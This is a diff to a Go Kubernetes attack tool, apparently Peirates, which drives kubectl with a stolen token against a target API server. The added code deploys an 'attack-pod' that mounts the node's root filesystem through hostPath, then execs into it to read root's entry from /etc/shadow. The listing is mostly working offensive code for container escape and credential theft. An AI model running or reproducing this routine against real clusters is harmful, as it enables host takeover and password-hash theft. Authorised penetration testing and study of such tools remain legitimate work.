@@ -15,11 +15,11 @@ import (
 	"fmt"       // String formatting (Printf, Sprintf)
 	"io/ioutil" // Utils for dealing with IO streams
 	"log"       // Logging utils
+	"math/rand" // Random module for creating random string building
 	"net/http"  // HTTP client/server
 	"os/exec"
 	"regexp"
 	"strings"
-	"math/rand" // Random module for creating random string building
 	"time" // Time modules
 
 	// Packages belonging to Peirates go here
@@ -46,7 +46,9 @@ func parseOptions(connectionString *config.ServerInfo) {
 	flag.StringVar(&connectionString.RIPAddress, "i", "10.23.58.40", "Remote IP address: ex. 10.22.34.67")
 	flag.StringVar(&connectionString.RPort, "p", "6443", "Remote Port: ex 10255, 10250")
 	// flag.BoolVar(&connectionString.infoPods, "e", false, "Export pod information from remote Kubernetes server via curl")
-	println("FIXME: parseOptions clobbers config.Builder()")
+
+	// JAY / TODO: println("FIXME: parseOptions clobbers config.Builder()")
+
 	// flag.StringVar(&connectionString.Token, "t", "", "Token to be used for accessing Kubernetes server")
 	// flag.StringVar(&connectionString.CAPath, "c", "", "Path to CA certificate")
 
@@ -106,9 +108,9 @@ func getHostname(connectionString config.ServerInfo, PodName string) string {
 	pod_hostname, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", PodName, "hostname").Output()
 	if err != nil {
 		fmt.Println("Checking for hostname of pod "+PodName+" failed: ", err)
-		return "- Hostname failed"
+		return "- Pod command exec failed for " + PodName + "\n"
 	} else {
-		return "+ Hostname is " + string(pod_hostname)
+		return "+ Pod discovered: " + string(pod_hostname)
 	}
 }
 
@@ -170,10 +172,9 @@ func requestme(connectionString config.ServerInfo, location string) {
 	println(string(contents))
 }
 
-
 //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 // Added mountFS code to create yaml file drop to disk and create a pod.    |
-//--------------------------------------------------------------------------| 
+//--------------------------------------------------------------------------|
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
@@ -191,25 +192,25 @@ func randSeq(n int) string {
 }
 
 type Mount_Info struct {
-	yaml_build  string
-	image string
-	namespace string
+	yaml_build string
+	image      string
+	namespace  string
 }
 
-func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo){
+func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo) {
 	var Mount_InfoVars = Mount_Info{}
-	fmt.Println("This is the output: ", string(all_pods_listme[1]))
+	// fmt.Println("DEBUG: grabbing image from pod: ", string(all_pods_listme[3]))
 	//Get pods
-//# Get the first pod from all_pod_listme
-//pod_to_examine = all_pod_listme[0]
+	//# Get the first pod from all_pod_listme
+	//pod_to_examine = all_pod_listme[0]
 
-//# Run a kubectl command to get YAML
-//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml
+	//# Run a kubectl command to get YAML
+	//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml
 
-//# Parse yaml output to get the image name
-//image_name = `grep "- image" yaml_output | awk '{print $3}'`
+	//# Parse yaml output to get the image name
+	//image_name = `grep "- image" yaml_output | awk '{print $3}'`
 
-	get_images_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods", all_pods_listme[0], "-o", "yaml",).Output()
+	get_images_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods", all_pods_listme[3], "-o", "yaml").Output()
 
 	get_image_lines := strings.Split(string(get_images_raw), "\n")
 
@@ -229,7 +230,7 @@ func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo){
 	}
 
 	//creat random  string
-	random_string :=randSeq(1)
+	random_string := randSeq(6)
 
 	// Create Yaml File
 	Mount_InfoVars.yaml_build = fmt.Sprintf(`apiVersion: v1
@@ -253,14 +254,23 @@ spec:
        path: /
 `, random_string, connectionString.Namespace, Mount_InfoVars.image)
 
-// Write yaml file out to current directory
+	// Write yaml file out to current directory
 	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)
 
-	_, err = exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "apply", "-f","attack-pod.yaml").Output()
+	_, err = exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "apply", "-f", "attack-pod.yaml").Output()
 	if err != nil {
 		log.Fatal(err)
+	} else {
+		attack_pod_name := "attack-pod-" + random_string
+		println("Executing code in " + attack_pod_name)
+		time.Sleep(2 * time.Second)
+		shadow_file_bs, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow").Output()
+		if err != nil {
+			log.Fatal(err)
+		} else {
+			println(string(shadow_file_bs))
+		}
 	}
-
 	//out, err = exec.Command("").Output()
 	//if err != nil {
 	//	fmt.Println("Token location error: ", err)
@@ -268,14 +278,7 @@ spec:
 	//fmt.Println(out)
 }
 
-
 //------------------------------------------------------------------------------------------------------------------------------------------------
-
-
-
-
-
-
 
 func main() {
 
@@ -296,8 +299,9 @@ func main() {
 	all_pods := get_pod_list(connectionString)
 
 	for _, pod := range all_pods {
-		println("Checking out pod: " + pod)
-		println(getHostname(connectionString, pod))
+		// JAY / TODO: Put me back
+		//println("Checking out pod: " + pod)
+		print(getHostname(connectionString, pod))
 	}
 
 	pod_creation := canCreatePods(connectionString)
@@ -342,4 +346,3 @@ https://10.23.58.40:6443/version
 https://10.23.58.40:6443/apis/apps/v1/proxy (500)
 https://10.23.58.40:6443/apis/apps/v1/watch (500)
 */
-
